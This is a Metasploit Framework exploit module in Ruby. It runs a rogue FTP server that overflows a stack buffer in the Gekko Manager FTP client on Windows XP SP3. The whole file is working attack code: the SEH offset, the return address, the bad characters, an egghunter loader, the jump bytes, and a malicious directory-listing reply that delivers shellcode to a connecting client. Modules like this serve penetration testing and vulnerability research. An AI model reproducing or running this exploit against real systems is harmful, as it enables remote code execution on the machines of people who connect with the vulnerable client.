##
# $Id: gekkomgr_list_reply.rb 11039 2010-11-14 19:03:24Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::FtpServer
	include Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Gekko Manager FTP Client Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Gekko Manager ftp client, triggered when
				processing the response received after sending a LIST request. If this response contains
				a long filename, a buffer overflow occurs, overwriting a structured exception handler.
			},
			'Author' 	 =>
				[
					'nullthreat',	# found the bug
					'corelanc0d3r',	# wrote the exploit
				],
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 11039 $",
			'References'     =>
				[
					[ 'OSVDB', '68641'],
					[ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'BadChars' => "\x00\xff\x0d\x5c\x2f\x0a",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'XP SP3 Universal', { 'Offset' => 376, 'Ret' => 0x00553C72  } ],  # ppr Gekko manager.exe
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 12 2010',
			'DefaultTarget'  => 0))
	end

	#---------------------------------------------------------------------------------

	def setup
		super
		badchars = "\x00\xff\x0d\x5c\x2f\x0a"
		eggoptions =
		{
		:checksum => true,
		:eggtag => "W00T"
		}
		@hunter,@egg = generate_egghunter(payload.encoded,badchars,eggoptions)

		enchunter = Msf::Util::EXE.encode_stub(framework, [ARCH_X86], @hunter, ::Msf::Module::PlatformList.win32, badchars)
		@hunter = enchunter
	end

	def on_client_unknown_command(c,cmd,arg)
		c.put("200 OK\r\n")
	end

	def on_client_command_pass(c,arg)
		c.put("230 OK #{@egg}\r\n")
		return
	end

	def on_client_command_list(c,arg)
		conn = establish_data_connection(c)
		if(not conn)
			c.put("425 Can't build data connection\r\n")
			return
		end
		print_status(" - Data connection set up")

		code = 150
		c.put("#{code} Here comes the directory listing.\r\n")
		code = 226
		c.put("#{code} Directory send ok.\r\n")

		#Setup for the shellcode
		offset_to_nseh = target['Offset']
		jmpback = "\xeb\x8d\xfe\xff\xff"
		nseh = "\xeb\xf9\x41\x41"
		seh = [target.ret].pack('V')
		strfile = "A" * (offset_to_nseh-@hunter.length-5)
		strfile << @hunter
		strfile << jmpback
		strfile << nseh
		strfile << seh

		print_status(" - Sending directory list via data connection")
		dirlist = "-rw-rw-r--    1 1176     1176         1060 Apr 23 23:17  #{strfile}.txt\r\n\r\n"
		conn.put(dirlist)
		conn.close
		print_status(" - Payload sent, wait for hunter...")
		return
	end

end

